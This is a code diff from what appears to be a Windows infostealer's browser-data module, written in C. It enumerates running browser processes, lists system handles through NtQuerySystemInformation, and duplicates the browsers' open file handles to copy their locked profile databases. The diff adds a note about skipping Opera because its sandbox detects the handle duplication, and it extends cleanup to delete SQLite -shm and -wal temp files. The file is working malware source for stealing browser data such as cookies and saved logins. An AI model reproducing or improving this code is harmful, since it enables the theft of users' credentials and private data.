@@ -1,46 +1,5 @@
 #include "Common.h"
 
-
-// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
-// Windows Definitions
-
-#define STATUS_SUCCESS                  ((NTSTATUS)0x00000000L)
-#define STATUS_INFO_LENGTH_MISMATCH     ((NTSTATUS)0xC0000004L)
-
-#define NT_SUCCESS(STATUS)              (((NTSTATUS)(STATUS)) >= STATUS_SUCCESS)
-
-typedef struct _SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX
-{
-    PVOID       Object;
-    ULONG_PTR   UniqueProcessId;
-    ULONG_PTR   HandleValue;
-    ULONG       GrantedAccess;
-    USHORT      CreatorBackTraceIndex;
-    USHORT      ObjectTypeIndex;
-    ULONG       HandleAttributes;
-    ULONG       Reserved;
-} SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX, * PSYSTEM_HANDLE_TABLE_ENTRY_INFO_EX;
-
-typedef struct _SYSTEM_HANDLE_INFORMATION_EX
-{
-    ULONG_PTR                           NumberOfHandles;
-    ULONG_PTR                           Reserved;
-    SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX   Handles[1];
-} SYSTEM_HANDLE_INFORMATION_EX, * PSYSTEM_HANDLE_INFORMATION_EX;
-
-// https://ntdoc.m417z.com/system_information_class
-typedef UINT SYSTEM_INFORMATION_CLASS;
-
-#define SystemExtendedHandleInformation 64
-
-// https://learn.microsoft.com/en-us/windows/win32/api/winternl/nf-winternl-ntquerysysteminformation
-typedef NTSTATUS (NTAPI* fnNtQuerySystemInformation)(
-    IN SYSTEM_INFORMATION_CLASS SystemInformationClass,
-    IN OUT PVOID                SystemInformation,
-    IN ULONG                    SystemInformationLength,
-    OUT PULONG                  ReturnLength OPTIONAL
-);
-
 // ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
 
 #define PATH_CACHE_CAPACITY     32
@@ -56,7 +15,6 @@ typedef struct _PATH_CACHE_ENTRY
 
 static PATH_CACHE_ENTRY             g_PathCache[PATH_CACHE_CAPACITY]        = { 0 };
 static DWORD                        g_dwPathCacheCount                      = 0x00;
-static fnNtQuerySystemInformation   g_pNtQuerySystemInformation             = NULL;
 
 // ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
 
@@ -271,7 +229,7 @@ static BOOL FindAndDuplicateFileHandle(IN PDWORD pdwPidArray, IN DWORD dwPidCoun
             goto _END_OF_FUNC;
         }
 
-        if ((ntSTATUS = g_pNtQuerySystemInformation(SystemExtendedHandleInformation, pHandleInfo, ulBufferSize, &ulReturnLength)) == STATUS_INFO_LENGTH_MISMATCH)
+        if ((ntSTATUS = g_pSharedFunctions->pNtQuerySystemInformation(SystemExtendedHandleInformation, pHandleInfo, ulBufferSize, &ulReturnLength)) == STATUS_INFO_LENGTH_MISMATCH)
         {
             HEAP_FREE(pHandleInfo);
 #define GROWTH_FACTOR 2
@@ -398,7 +356,7 @@ static BOOL FindAndDuplicateFileHandleEx(IN PDWORD pdwPidArray, IN DWORD dwPidCo
             goto _END_OF_FUNC;
         }
 
-        if ((ntSTATUS = g_pNtQuerySystemInformation(SystemExtendedHandleInformation, pHandleInfo, ulBufferSize, &ulReturnLength)) == STATUS_INFO_LENGTH_MISMATCH)
+        if ((ntSTATUS = g_pSharedFunctions->pNtQuerySystemInformation(SystemExtendedHandleInformation, pHandleInfo, ulBufferSize, &ulReturnLength)) == STATUS_INFO_LENGTH_MISMATCH)
         {
             HEAP_FREE(pHandleInfo);
 #define GROWTH_FACTOR 2
@@ -627,46 +585,43 @@ LPSTR GetBrowserDataFilePath(IN BROWSER_TYPE Browser, IN LPCSTR pszRelPath)
     }
 
     // Try handle duplication if browser is running
-    do
+    // Skip Opera/Opera GX because Opera.exe' sandbox aggressively monitors handle operations
+    // and will self-terminate (FatalExit 21) when it detects excessive external handle duplication, unlike Chrome/Edge/Brave.
+    // ~ This was my quick analysis at least
+    if (Browser != BROWSER_OPERA && Browser != BROWSER_OPERA_GX)
     {
-        WCHAR   wszRelPath[MAX_PATH]        = { 0 };
-        WCHAR   wszBrowserName[MAX_PATH]    = { 0 };
-
-        if (!g_pNtQuerySystemInformation)
+        do
         {
-            if (!(g_pNtQuerySystemInformation = (fnNtQuerySystemInformation)GetProcAddress(GetModuleHandle(TEXT("NTDLL")), "NtQuerySystemInformation")))
-            {
-                DBGA("[!] GetProcAddress Failed With Error: %lu", GetLastError());
+            WCHAR   wszRelPath[MAX_PATH] = { 0 };
+            WCHAR   wszBrowserName[MAX_PATH] = { 0 };
+
+            if (!MultiByteToWideChar(CP_ACP, 0x00, GetBrowserProcessName(Browser), -1, wszBrowserName, MAX_PATH))
                 break;
+
+            if (!EnumerateTargetProcesses(wszBrowserName, &pdwPidArray, &dwPidCount) || dwPidCount == 0x00)
+                break;
+
+            DBGV("[i] Found %lu Running Browser Processes", dwPidCount);
+            DBGV("[v] Attempting To Steal Opened File Handles...");
+
+            if (!MultiByteToWideChar(CP_ACP, 0x00, pszRelPath, -1, wszRelPath, MAX_PATH))
+                break;
+
+            if (!FindAndDuplicateFileHandle(pdwPidArray, dwPidCount, wszRelPath, &hDuplicatedHandle))
+                break;
+
+            if (CopyFileViaHandle(hDuplicatedHandle, szTempFile))
+            {
+                DBGV("[v] Successfully Copied File Via Duplicated Handle");
+                bCopiedViaHandle = TRUE;
             }
-        }
 
-        if (!MultiByteToWideChar(CP_ACP, 0x00, GetBrowserProcessName(Browser), -1, wszBrowserName, MAX_PATH))
-            break;
+        } while (0);
 
-        if (!EnumerateTargetProcesses(wszBrowserName, &pdwPidArray, &dwPidCount) || dwPidCount == 0x00)
-            break;
+        if (hDuplicatedHandle) CloseHandle(hDuplicatedHandle);
 
-        DBGV("[i] Found %lu Running Browser Processes", dwPidCount);
-        DBGV("[v] Attempting To Steal Opened File Handles...");
-
-        if (!MultiByteToWideChar(CP_ACP, 0x00, pszRelPath, -1, wszRelPath, MAX_PATH))
-            break;
-
-        if (!FindAndDuplicateFileHandle(pdwPidArray, dwPidCount, wszRelPath, &hDuplicatedHandle))
-            break;
-
-        if (CopyFileViaHandle(hDuplicatedHandle, szTempFile))
-        {
-            DBGV("[v] Successfully Copied File Via Duplicated Handle");
-            bCopiedViaHandle = TRUE;
-        }
-
-    } while (0);
-
-    if (hDuplicatedHandle) CloseHandle(hDuplicatedHandle);
-    
-    HEAP_FREE(pdwPidArray);
+        HEAP_FREE(pdwPidArray);
+    }
 
     if (!bCopiedViaHandle)
     {
@@ -740,15 +695,6 @@ DWORD GetBrowserDataFilePathEx(IN BROWSER_TYPE Browser, IN LPCSTR* ppszRelPaths,
     // Enumerate browser processes and duplicate all handles at once
     do
     {
-        if (!g_pNtQuerySystemInformation)
-        {
-            if (!(g_pNtQuerySystemInformation = (fnNtQuerySystemInformation)GetProcAddress(GetModuleHandle(TEXT("NTDLL")), "NtQuerySystemInformation")))
-            {
-                DBGA("[!] GetProcAddress Failed With Error: %lu", GetLastError());
-                break;
-            }
-        }
-
         if (!MultiByteToWideChar(CP_ACP, 0x00, GetBrowserProcessName(Browser), -1, wszBrowserName, MAX_PATH))
             break;
 
@@ -862,10 +808,22 @@ DWORD GetBrowserDataFilePathEx(IN BROWSER_TYPE Browser, IN LPCSTR* ppszRelPaths,
 
 VOID DeleteDataFilesCache()
 {
+    CHAR szCompanionPath[MAX_PATH] = { 0 };
+
     for (DWORD i = 0; i < g_dwPathCacheCount; i++)
     {
         if (g_PathCache[i].szTmpDataFilePath[0])
+        {
             DeleteFileA(g_PathCache[i].szTmpDataFilePath);
+
+            StringCchCopyA(szCompanionPath, MAX_PATH, g_PathCache[i].szTmpDataFilePath);
+            StringCchCatA(szCompanionPath, MAX_PATH, "-shm");
+            DeleteFileA(szCompanionPath);
+
+            StringCchCopyA(szCompanionPath, MAX_PATH, g_PathCache[i].szTmpDataFilePath);
+            StringCchCatA(szCompanionPath, MAX_PATH, "-wal");
+            DeleteFileA(szCompanionPath);
+        }
     }
 
     RtlSecureZeroMemory(g_PathCache, sizeof(g_PathCache));
